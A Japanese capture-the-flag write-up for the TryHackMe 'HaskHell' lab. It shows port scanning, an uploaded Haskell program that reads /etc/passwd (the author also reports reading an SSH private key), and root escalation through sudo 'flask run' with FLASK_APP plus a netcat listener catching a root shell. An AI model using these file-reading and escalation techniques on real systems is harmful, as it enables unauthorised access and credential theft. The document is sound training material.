# HaskHell CTF

https://tryhackme.com/room/haskhell

## Enumeration

```shell
TARGET=10.201.17.128
sudo bash -c "echo $TARGET   haskhell.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -sS -p- $TARGET

PORT     STATE SERVICE
22/tcp   open  ssh
5001/tcp open  commplex-link
```

```sh
sudo nmap -sS -sV -p22,5001 $TARGET

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
5001/tcp open  http    Gunicorn 19.7.1
```

SSH, HTTP。Gunicorn 19.7.1

## homework1

アップロードパスの /upload はリンクが切れている。

dirsearch で下記のパスを発見。

```sh
[19:32:27] 200 -  237B  - /submit                                           
[19:32:44] 200 -  131B  - /uploads/affwp-debug.log
```

fib関数と、ファイルを出力するHaskellファイルを submit からアップロードした。

```hs
fib :: Int -> Int -> [Int]
fib a b = a : fib b (a + b)

main :: IO ()
main = do
  contents <- readFile "/etc/passwd"
  putStrLn contents
```

/etc/passwd ファイルの入手に成功した。

```
[1 of 1] Compiling Main             ( /home/flask/uploads/fibo.hs, /home/flask/uploads/fibo.o )
Linking /home/flask/uploads/fibo ...
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
haskell:x:1000:1000:haskhell:/home/haskell:/bin/bash
flask:x:1001:1001::/home/flask:/bin/sh
prof:x:1002:1002::/home/prof:/bin/sh
```

prof ユーザーのSSH秘密鍵も同様に表示できた。

## 権限昇格

flask run を root として実行できる。`env_keep+=FLASK_APP` にも注目。

```sh
$ sudo -l   
Matching Defaults entries for prof on haskhell:
    env_reset, env_keep+=FLASK_APP, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User prof may run the following commands on haskhell:
    (root) NOPASSWD: /usr/bin/flask run
```

myapp.py を保存して実行する。

```sh
export FLASK_APP=myapp.py
sudo /usr/bin/flask run
```

rootシェル取得成功。

```sh
$ nc -nlvp 8888    
listening on [any] 8888 ...
connect to [10.11.146.32] from (UNKNOWN) [10.201.10.183] 48020
# id
id
uid=0(root) gid=0(root) groups=0(root)
```

## 振り返り

- Haskell は初めて触った。
- とてもイージーだったが、良い練習になった。
